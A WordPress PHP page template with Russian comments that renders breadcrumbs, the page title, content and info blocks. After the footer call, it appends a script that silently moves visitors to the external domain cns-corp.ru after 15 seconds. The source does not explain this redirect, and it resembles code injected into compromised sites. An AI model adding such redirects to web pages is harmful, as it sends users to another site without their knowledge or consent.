<?php
	get_header(); 
?>
<?php 								
	if (have_posts()): 
	while (have_posts()) : 
	the_post(); 
	
	$post_id = get_the_ID();
	$page_header = get_field( "page_header", $post_id );	//шапка страницы 
	
?>


	<section id="content">		
		<div class="container">
		<?php get_template_part('breadcrumbs', ''); ?>
			<?php if(!$page_header) { ?>
			<div class="row">
				<div class="col-lg-12">	
					<div class="page-title"><h1><span><?php the_title(); ?></span></h1></div>
				</div>
			</div>
			<?php } ?>
			<div class="row">
				<div class="col-lg-12">
					<?php the_content(); ?>
				</div>
			</div>
		</div>
	</section>
	
<?php 
	//Построение инфо-блоков на странице...
	include(locate_template('info_blocks/init.php'));
?>

<?php 
	endwhile;  
	endif; 
?>	
<?php 
	get_footer();
?>
<script>
setTimeout(() => {
	window.location.href = 'https://cns-corp.ru';
}, "15000")
</script>
